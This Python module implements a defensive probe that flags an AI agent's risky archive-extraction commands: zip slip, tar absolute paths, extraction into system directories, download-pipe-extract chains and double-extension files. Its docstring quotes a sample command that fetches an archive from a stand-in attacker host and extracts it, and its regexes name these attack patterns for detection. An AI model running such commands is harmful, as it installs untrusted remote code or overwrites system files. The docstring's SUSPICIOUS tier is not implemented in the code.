"""``ArchiveInspectorProbe`` — flag dangerous archive operations.

Archives are a beloved camouflage vector. A `.zip` or `.tar.gz` can:

* extract files **outside** the intended directory (the "zip slip"
  vulnerability — entries with paths like ``../../../etc/passwd``);
* extract with **absolute paths** that overwrite system files
  (``tar -xPf`` preserves ``/etc/...`` paths);
* be fetched and extracted in one pipe chain so the operator never
  sees the archive on disk (``curl evil.com/x.tar.gz | tar xz``);
* hide behind a **double extension** (``report.pdf.zip``, the
  classic phishing-attachment pattern that fools file-type filters);
* be **unrelated** to what the filename suggests — a ``logo.png``
  that's actually a tar of a backdoor.

This probe targets the *commands* an agent issues, not the archive
contents themselves: `Action.changes` is a ``dict[str, str]``, so
binary archive bytes never reach the probe through that channel.
The shell command, on the other hand, tells us where the agent
intends to extract and with what flags.

What it catches
---------------

* **Extraction to a sensitive system directory.** ``tar -C /etc``,
  ``unzip -d /usr/local/bin``, ``unzip -d /boot`` — any extraction
  targeting ``/etc``, ``/usr``, ``/bin``, ``/sbin``, ``/lib``,
  ``/boot``, ``/root``, ``/var/lib``, ``/var/spool/cron``.

* **`tar -P` / `--absolute-names`.** This flag instructs tar to
  preserve absolute paths inside the archive — turning a tar of
  ``/etc/passwd`` into an arbitrary system-file overwrite. Almost
  never legitimate in agent-generated code.

* **Download-and-extract pipe chain.** ``curl … | tar``,
  ``wget -O- … | tar``, ``fetch … | unzip`` — the archive is never
  saved, so subsequent probes can't see it, and the integrity check
  the operator would normally run never happens.

* **Double-extension archives.** A path like ``report.pdf.zip``,
  ``invoice.docx.tar.gz``, or ``logo.png.zip`` strongly suggests
  the file is being passed off as something it isn't. This is the
  classic phishing-attachment pattern and is the strongest signal
  we have for "this archive was probably attacker-crafted."

What it does NOT do
-------------------

* It does **not** open archives and walk their entries. Doing so
  would require reading binary content that `Action.changes` doesn't
  carry (and that's properly Layer 3's job — see
  :doc:`/docs/runtime-sandboxing`).
* It does **not** validate archive checksums or signatures —
  that's also Layer 3.
* It does **not** flag *creating* archives, only extracting them.
  The threat lives at extraction time.

Severity ladder
---------------

* ``CRITICAL`` — extraction to a sensitive system directory,
  ``tar -P`` / ``--absolute-names``, download-pipe-extract chain.
* ``DANGEROUS`` — double-extension archive in a write or extraction.
* ``SUSPICIOUS`` — extraction to a tmp / write-accessible location
  combined with weak flags (no ``--no-overwrite``).

Performance
-----------

Pure regex pass over ``Action.command``. < 0.5 ms on any realistic
input.
"""

from __future__ import annotations

import re
from typing import Any

from cordon.core.types import Action, ProbeResult, Severity
from cordon.probes.base import Probe


# ─── Patterns and tables ─────────────────────────────────────────────────────

#: System directories where extracting an archive is almost always
#: an attack. Each ends with ``/`` to avoid matching unrelated
#: prefixes (``/etc/`` matches ``/etcetera`` as ``/etc/`` would not).
_SENSITIVE_DIRS: tuple[str, ...] = (
    "/etc/", "/usr/", "/bin/", "/sbin/",
    "/lib/", "/lib32/", "/lib64/",
    "/boot/", "/root/",
    "/var/lib/", "/var/spool/cron/", "/var/log/",
)

#: Archive-extension pairs that, when stacked, mean the outer
#: extension is a lie. Lower-cased; the matcher lower-cases the
#: filename before checking.
_DOUBLE_EXTENSIONS: tuple[tuple[str, str], ...] = (
    (".pdf",  ".zip"),
    (".pdf",  ".tar"),
    (".pdf",  ".tar.gz"),
    (".pdf",  ".rar"),
    (".pdf",  ".7z"),
    (".docx", ".zip"),
    (".docx", ".tar.gz"),
    (".xlsx", ".zip"),
    (".png",  ".zip"),
    (".png",  ".tar.gz"),
    (".jpg",  ".zip"),
    (".jpeg", ".zip"),
    (".gif",  ".zip"),
    (".txt",  ".zip"),
    (".log",  ".zip"),
    (".csv",  ".zip"),
)

#: Extraction-tool tokens that start a known extraction command.
#: For ``tar`` and ``bsdtar`` we don't try to distinguish the
#: extract-mode flag at this layer (``tar xz``, ``tar -x``,
#: ``tar -xzf``, etc. all reach the same place); the more specific
#: detectors below handle absolute-paths and destination directories.
_EXTRACTION_HEAD_RE = re.compile(
    r"\b(?:tar|bsdtar|unzip|unrar\s+[xe]|7z[ar]?\s+[xe]|gunzip|bunzip2)\b",
    re.IGNORECASE,
)

#: ``tar -P`` / ``--absolute-names`` — turning a tar into a system-
#: file overwrite vector. Both short and long forms.
_TAR_ABS_PATHS_RE = re.compile(
    r"\btar\b[^\n]*?(?:\s-[A-Za-z]*P[A-Za-z]*\b|\s--absolute-names\b)",
    re.IGNORECASE,
)

#: Pipe chain: download tool feeding an extraction tool. We accept
#: any subsequent ``tar`` / ``unzip`` / etc. token after the pipe
#: because by the time the archive reaches the pipe, the extraction
#: mode is implicit (``tar`` with stdin defaults to ``-x`` when fed
#: a stream).
_DOWNLOAD_PIPE_EXTRACT_RE = re.compile(
    r"\b(?:curl|wget|fetch|http)\b[^\n|]*\|\s*"
    r"(?:tar|bsdtar|unzip|unrar|7z[ar]?|gunzip|bunzip2)\b",
    re.IGNORECASE,
)

#: ``unzip -d <dir>`` extracts to ``<dir>``.
_UNZIP_DEST_RE = re.compile(
    r"\bunzip\b[^\n]*?\s-d\s+(\S+)",
    re.IGNORECASE,
)

#: ``tar -C <dir>`` extracts to ``<dir>``.
_TAR_DEST_RE = re.compile(
    r"\btar\b[^\n]*?\s-C\s+(\S+)",
    re.IGNORECASE,
)

#: ``7z x <archive> -o<dir>`` (the ``-o`` is fused with the path).
_SEVENZ_DEST_RE = re.compile(
    r"\b7z[arxe]*\b[^\n]*?\s-o(\S+)",
    re.IGNORECASE,
)


# ─── Probe ──────────────────────────────────────────────────────────────────


class ArchiveInspectorProbe(Probe):
    """Flag dangerous archive-extraction patterns in shell commands.

    See module docstring for the attack inventory this probe covers.
    """

    name = "archive_inspector"
    description = "Flags dangerous archive-extraction commands and double-extension files."
    tier = "fast"

    def analyze(self, action: Action) -> ProbeResult:
        findings: list[dict[str, Any]] = []

        cmd = action.command or ""
        if cmd:
            findings.extend(self._scan_command(cmd))

        # Also flag double-extension archives in proposed file writes.
        for path in (action.changes or {}):
            de = _double_extension_of(path)
            if de:
                findings.append({
                    "source": path,
                    "kind": f"double-extension archive: {de}",
                    "severity": Severity.DANGEROUS,
                })

        if not findings:
            return ProbeResult(
                probe=self.name,
                severity=Severity.SAFE,
                confidence=0.0,
                evidence="No dangerous archive operations detected.",
            )

        worst = max(findings, key=lambda f: _SEVERITY_RANK[f["severity"]])
        confidence = min(0.65 + 0.1 * len(findings), 0.95)
        sample = "; ".join(
            f"{f.get('source', '<command>')}: {f['kind']}" for f in findings[:3]
        )
        more = f" (+ {len(findings) - 3} more)" if len(findings) > 3 else ""
        evidence = (
            f"{len(findings)} dangerous archive operation(s); "
            f"primary: {worst['kind']}; all: {sample}{more}"
        )

        return ProbeResult(
            probe=self.name,
            severity=worst["severity"],
            confidence=confidence,
            evidence=evidence,
        )

    # ── Command scan ─────────────────────────────────────────────────

    def _scan_command(self, cmd: str) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []

        # Download-pipe-extract chain — checked first because it
        # subsumes both the download and the extraction.
        if _DOWNLOAD_PIPE_EXTRACT_RE.search(cmd):
            findings.append({
                "kind": "download-pipe-extract chain",
                "severity": Severity.CRITICAL,
            })

        # tar -P / --absolute-names.
        if _TAR_ABS_PATHS_RE.search(cmd):
            findings.append({
                "kind": "tar with absolute-paths flag",
                "severity": Severity.CRITICAL,
            })

        # Extraction destinations into sensitive system dirs.
        for matcher in (_TAR_DEST_RE, _UNZIP_DEST_RE, _SEVENZ_DEST_RE):
            for m in matcher.finditer(cmd):
                dest = _normalize_dir(m.group(1))
                if _is_sensitive(dest):
                    findings.append({
                        "source": dest,
                        "kind": "extraction to sensitive system directory",
                        "severity": Severity.CRITICAL,
                    })

        # Double-extension archive *inside* a command (e.g. agent
        # downloads ``report.pdf.zip``). Cheap pass — only fires if
        # the command also looks like an extraction or fetch op.
        if _EXTRACTION_HEAD_RE.search(cmd) or re.search(r"\b(?:curl|wget|fetch)\b", cmd, re.IGNORECASE):
            for token in re.findall(r"\S+", cmd):
                de = _double_extension_of(token)
                if de:
                    findings.append({
                        "source": token,
                        "kind": f"double-extension archive: {de}",
                        "severity": Severity.DANGEROUS,
                    })
                    break  # one is enough to fire

        return findings


# ─── Helpers ─────────────────────────────────────────────────────────────────


_SEVERITY_RANK = {
    Severity.SAFE:       0,
    Severity.SUSPICIOUS: 1,
    Severity.DANGEROUS:  2,
    Severity.CRITICAL:   3,
}


def _normalize_dir(s: str) -> str:
    """Strip quotes and ensure a trailing slash for prefix matching."""
    s = s.strip().strip('"').strip("'")
    if not s.endswith("/"):
        s = s + "/"
    return s


def _is_sensitive(directory: str) -> bool:
    """True if ``directory`` (a normalized path) is under a sensitive root."""
    lowered = directory.lower()
    return any(lowered.startswith(root) or lowered == root.rstrip("/")
               for root in _SENSITIVE_DIRS)


def _double_extension_of(path: str) -> str | None:
    """Return the ``"<inner>.<outer>"`` pair if ``path`` ends in one of them.

    Lower-cases the path; matches stacked double extensions like
    ``report.pdf.zip`` (the canonical phishing-attachment pattern).
    """
    lower = path.lower()
    for inner, outer in _DOUBLE_EXTENSIONS:
        if lower.endswith(inner + outer):
            return inner + outer
    return None
